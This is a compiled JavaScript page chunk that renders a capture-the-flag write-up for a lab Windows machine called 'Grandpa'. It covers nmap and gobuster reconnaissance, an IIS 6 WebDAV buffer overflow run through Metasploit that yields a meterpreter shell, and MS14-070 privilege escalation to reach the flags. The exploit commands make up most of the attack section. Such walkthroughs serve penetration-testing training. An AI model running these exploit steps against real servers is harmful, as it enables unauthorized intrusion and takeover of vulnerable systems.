(window.webpackJsonp=window.webpackJsonp||[]).push([[75],{416:function(s,e,t){"use strict";t.r(e);var a=t(13),r=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"grandpa"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#grandpa"}},[s._v("#")]),s._v(" Grandpa")]),s._v(" "),e("h2",{attrs:{id:"nmap-scan"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#nmap-scan"}},[s._v("#")]),s._v(" Nmap scan")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T5")]),s._v(" -p- "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.14\n")])])]),e("p",[s._v("results:")]),s._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 01:19 EDT\nNmap scan report for 10.10.10.14\nHost is up (0.20s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 6.0\n| http-methods: \n|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\n| http-webdav-scan: \n|   Server Date: Sun, 12 Apr 2020 05:24:43 GMT\n|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n|   Server Type: Microsoft-IIS/6.0\n|   WebDAV type: Unknown\n|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4\nAggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   199.82 ms 10.10.14.1\n2   199.97 ms 10.10.10.14\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 232.57 seconds\n")])])]),e("p",[s._v("From this, we see that there is a webDAV server running on port 80. Let's see if there are any exploits for this. While we are looking for exploits on WebDAV, let's also run "),e("code",[s._v("gobuster")]),s._v(" on this server")]),s._v(" "),e("h2",{attrs:{id:"gobuster"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#gobuster"}},[s._v("#")]),s._v(" Gobuster")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("gobuster "),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.14 "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\n")])])]),e("h2",{attrs:{id:"webdav"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#webdav"}},[s._v("#")]),s._v(" WebDAV")]),s._v(" "),e("h3",{attrs:{id:"metasploit"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metasploit"}},[s._v("#")]),s._v(" Metasploit")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("msfconsole\nuse auxiliary/scanner/http/webdav_scanner\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" RHOSTS "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.14\nrun\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.14 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Microsoft-IIS/6.0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" has WEBDAV ENABLED\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Scanned "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" of "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" hosts "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),s._v("% complete"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Auxiliary module execution completed\n")])])]),e("p",[s._v("From the looks of it, the server does indeed have webDAV enabled. And we also know a key information, that it's running "),e("code",[s._v("IIS-6")]),s._v(".")]),s._v(" "),e("p",[s._v("Let's test the DAV server out with "),e("code",[s._v("davtest")])]),s._v(" "),e("h3",{attrs:{id:"davtest"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#davtest"}},[s._v("#")]),s._v(" Davtest")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("davtest "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--url")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.14\n")])])]),e("p",[s._v("And seems like we get denied all PUT requests on the DAV server for remote code execution.")]),s._v(" "),e("h3",{attrs:{id:"metasploit-webdav-exploit"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metasploit-webdav-exploit"}},[s._v("#")]),s._v(" Metasploit WebDAV exploit")]),s._v(" "),e("p",[s._v("Looking around for the error message on the webpage, we see that there's a windows IIS 6 webdav server running. Looking in rapid7 for an exploit, it results us with a buffer overflow exploit that existed back in 2018.")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("msfconsole\nuse exploit/windows/iis/iis_webdav_scstoragepathfromurl\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhosts "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.14\nrun\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# meterpreter shell is spawned")]),s._v("\n")])])]),e("p",[s._v("Let's migrate to another process since this meterpreter shell is very unstable")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v("\nmigrate "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2496")]),s._v("\n")])])]),e("h3",{attrs:{id:"priv-esc"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[s._v("#")]),s._v(" Priv esc")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("sysinfo "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# inside meterpreter")]),s._v("\n")])])]),e("p",[s._v("Now copy and past the sysinfo file into a file called "),e("code",[s._v("sysinfo.txt")]),s._v(" on own computer.\nNow use "),e("code",[s._v("windows-exploit-suggester.py")])]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("windows-exploit-suggester.py "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),s._v("-04-10-mssb.xls "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" systeminfo.txt\n")])])]),e("p",[s._v("We will try MS-14-070")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("background "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# background the meterpreter session")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Using the rapid7 doc for MS14-070 exploit")]),s._v("\nuse exploit/windows/local/ms14_070_tcpip_ioctl\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("SESSION")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("meterpreter session id"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\nexploit\n")])])]),e("p",[s._v("and the flags are in the folder called "),e("code",[s._v("documents and settings")])])])}),[],!1,null,null,null);e.default=r.exports}}]);